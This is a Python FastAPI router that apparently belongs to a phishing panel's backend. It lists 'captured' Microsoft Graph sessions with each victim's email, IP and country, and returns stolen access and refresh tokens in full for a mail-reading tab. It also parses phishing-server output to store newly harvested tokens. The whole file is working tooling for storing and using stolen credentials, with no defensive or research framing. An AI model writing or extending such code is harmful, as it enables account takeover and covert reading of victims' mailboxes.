"""Captured phishing/Graph sessions backed by the token_store.

A "session" is one captured row from Webserver.py, equivalent to one
saved token in the SQLite store. We expose list/detail/cookies/mail-token
endpoints the frontend's Dashboard table consumes.
"""
from __future__ import annotations

from typing import Optional

from fastapi import APIRouter, HTTPException

from app.services import output_parser
from app.utils import token_store, jwt_decoder

router = APIRouter(prefix="/sessions", tags=["Sessions"])


def _token_to_session(row: dict) -> dict:
    """Shape a tokens row into the dashboard's CapturedSessionsTable row."""
    decoded = jwt_decoder.decode_jwt(row.get("access_token") or "") or {}
    payload = decoded.get("payload") or {}
    return {
        "id": row.get("id"),
        "name": row.get("name"),
        "email": row.get("account") or payload.get("upn") or payload.get("preferred_username"),
        "ip": payload.get("ipaddr") or "unknown",
        "country": (payload.get("ctry") or "UNK").upper(),
        "status": "Expired" if decoded.get("is_expired") else "Active",
        "captured": row.get("created_at"),
        "tenant_id": row.get("tenant_id"),
        "client_id": row.get("client_id"),
        "scope": row.get("scope"),
        "has_refresh": bool(row.get("refresh_token")),
        "raw": row,
    }


@router.get("/")
def list_sessions():
    rows = token_store.list_tokens()
    sessions = [_token_to_session(r) for r in rows]
    return {
        "count": len(sessions),
        "sessions": sessions,
    }


@router.get("/{session_id}")
def session_detail(session_id: int):
    rows = token_store.list_tokens()
    for row in rows:
        if row.get("id") == session_id:
            full = token_store.get_token(row["name"])
            return _token_to_session(full)
    raise HTTPException(404, "session not found")


@router.get("/{session_id}/cookies")
def cookies(session_id: int):
    """Return the IMAP/SMTP cookie-equivalents the dashboard expects.

    Built from the access_token + refresh_token of the captured session.
    """
    rows = token_store.list_tokens()
    target = None
    for row in rows:
        if row.get("id") == session_id:
            target = token_store.get_token(row["name"])
            break
    if not target:
        raise HTTPException(404, "session not found")
    at = target.get("access_token", "")
    rt = target.get("refresh_token") or ""
    return {
        "session_id": session_id,
        "cookies": [
            {"name": "access_token", "value": at[:48] + "...",
             "domain": "graph.microsoft.com", "path": "/",
             "httpOnly": True, "secure": True},
            {"name": "refresh_token", "value": rt[:32] + "..." if rt else "",
             "domain": "graph.microsoft.com", "path": "/",
             "httpOnly": True, "secure": True},
        ],
    }


@router.get("/{session_id}/mail-token")
def mail_token(session_id: int):
    """Return the Graph access_token + decoded JWT for the Mail tab."""
    rows = token_store.list_tokens()
    for row in rows:
        if row.get("id") == session_id:
            full = token_store.get_token(row["name"])
            return {
                "session_id": session_id,
                "token": full.get("access_token"),
                "refresh_token": full.get("refresh_token"),
                "decoded": jwt_decoder.decode_jwt(full.get("access_token") or ""),
            }
    raise HTTPException(404, "session not found")


@router.get("/{session_id}/webmail")
def webmail(session_id: int, folder: str = "Inbox", limit: int = 25):
    """Combined endpoint: returns decoded token + decoded mailbox creds.

    For now, this is just a façade over the captured access token.
    Real Graph API call happens in the Mailbox tab's mail proxy.
    """
    rows = token_store.list_tokens()
    target = None
    for row in rows:
        if row.get("id") == session_id:
            target = token_store.get_token(row["name"])
            break
    if not target:
        raise HTTPException(404, "session not found")
    decoded = jwt_decoder.decode_jwt(target.get("access_token") or "") or {}
    return {
        "session_id": session_id,
        "folder": folder,
        "limit": limit,
        "account": decoded.get("payload", {}).get("upn"),
        "tenant_id": decoded.get("payload", {}).get("tid"),
        "messages": [],
        "note": "Wire to /mailbox/proxy/{name}/messages for real inbox",
    }


@router.delete("/{session_id}")
def delete_session(session_id: int):
    rows = token_store.list_tokens()
    for row in rows:
        if row.get("id") == session_id:
            token_store.delete_token(row["name"])
            return {"ok": True, "id": session_id, "name": row["name"]}
    raise HTTPException(404, "session not found")


@router.post("/parse-stdout")
def parse_session_stdout(payload: dict):
    """Parse a captured stdout blob into a session row.

    Body: {"stdout": "...", "name": "optional"}
    """
    stdout = payload.get("stdout", "")
    parsed = output_parser.parse_stdout(stdout)
    capture = output_parser.extract_phish_capture(parsed)
    if not capture.get("access_token"):
        return {"ok": False, "error": "no access_token in stdout", "parsed": parsed}
    name = payload.get("name") or f"sess-{parsed['emails'][0].split('@')[0] if parsed['emails'] else 'unknown'}"
    token_store.save_token(name, {
        "access_token": capture["access_token"],
        "refresh_token": capture.get("refresh_token"),
        "id_token": capture.get("id_token"),
        "scope": capture.get("scope"),
        "client_id": capture.get("client_id"),
        "tenant_id": capture.get("tenant_id"),
        "account": capture.get("user_principal_name"),
        "account_type": "Microsoft",
        "expires_in": capture.get("expires_in") or 3600,
    })
    return {"ok": True, "name": name, "capture": capture}